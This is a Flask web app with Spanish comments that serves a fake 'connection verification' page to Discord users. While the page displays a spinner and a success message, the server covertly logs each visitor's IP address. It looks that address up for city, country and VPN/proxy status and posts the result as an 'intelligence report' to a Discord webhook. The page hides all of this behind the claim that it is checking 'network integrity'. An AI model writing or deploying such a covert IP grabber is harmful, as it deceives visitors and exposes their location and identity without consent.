from flask import Flask, request, render_template_string
import requests
import os

app = Flask(__name__)

# CONFIGURACIÓN: Aquí pondrás el Webhook que copies de tu canal 🛡️-sk3-intel
WEBHOOK_URL = os.getenv("SK3_WEBHOOK")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>SK3 SDK - Verification</title>
    <style>
        body { background: #2b2d31; color: white; font-family: sans-serif; text-align: center; padding-top: 100px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h1>Verificando Conexión...</h1>
    <p>Analizando integridad de red para SK3 Security.</p>
    <script>
        setTimeout(() => { document.body.innerHTML = "<h1>✅ Verificación Exitosa</h1><p>Ya puedes volver a Discord.</p>"; }, 3000);
    </script>
</body>
</html>
"""

@app.route('/')
def verify():
    # 1. Obtener IP real del usuario
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip: ip = ip.split(',')[0]

    # 2. Consultar si es VPN (Usamos la API gratuita de ip-api)
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,city,proxy,hosting").json()
        is_vpn = "SÍ ⚠️" if res.get("proxy") or res.get("hosting") else "NO ✅"
        country = res.get("country", "Desconocido")
        city = res.get("city", "Desconocida")
    except:
        is_vpn, country, city = "Error", "Error", "Error"

    # 3. Enviar el reporte al Webhook del bot
    if WEBHOOK_URL:
        payload = {
            "embeds": [{
                "title": "🛰️ REPORTE DE INTELIGENCIA SK3",
                "description": f"**Usuario analizado:** Un miembro hizo clic\n**IP:** `{ip}`\n**Ubicación:** `{city}, {country}`\n**VPN/Proxy:** `{is_vpn}`",
                "color": 16711680 if "SÍ" in is_vpn else 65280,
                "footer": {"text": "Titanium Core Security"}
            }]
        }
        requests.post(WEBHOOK_URL, json=payload)

    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=os.getenv("PORT", 5000))